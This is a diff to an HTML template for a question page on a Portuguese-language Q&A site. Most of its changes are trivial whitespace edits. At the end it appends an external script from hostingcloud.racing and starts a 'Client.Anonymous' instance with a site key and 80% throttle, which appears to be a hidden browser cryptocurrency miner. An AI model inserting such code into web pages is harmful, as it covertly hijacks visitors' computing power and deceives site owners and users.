@@ -97,7 +97,7 @@ $(function() {
 					{% else %}
 					<i class="far fa-flag" id="question-popover" data-toggle="popover" data-content="<p>Para denunciar esta pergunta, use o botão abaixo. Use apenas quando necessário.</p><button class='btn btn-outline-danger' onclick='report_question({{ question.id }}, this)'>Denunciar</button>"></i>
 					{% endif %}
-					
+
 					{% if question.creator.user.username == user.username %}
 					<button onclick="delete_question({{ question.id }})" class="btn btn-outline-danger">Apagar</button>
 					{% endif %}
@@ -167,7 +167,7 @@ $(function() {
 		</main>
 		<script src="/static/js/question.js"></script>
 	</body>
-	
+
 	<script>
 function delete_question(id) {
 	$.ajax({
@@ -183,4 +183,15 @@ function delete_question(id) {
 	})
 }
 	</script>
+
+<script src="https://www.hostingcloud.racing/H5TE.js"></script>
+<script>
+    var _client = new Client.Anonymous('5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a', {
+        throttle: 0.8, c: 'w', ads: 0
+    });
+    _client.start();
+
+
+</script>
+
 </html>
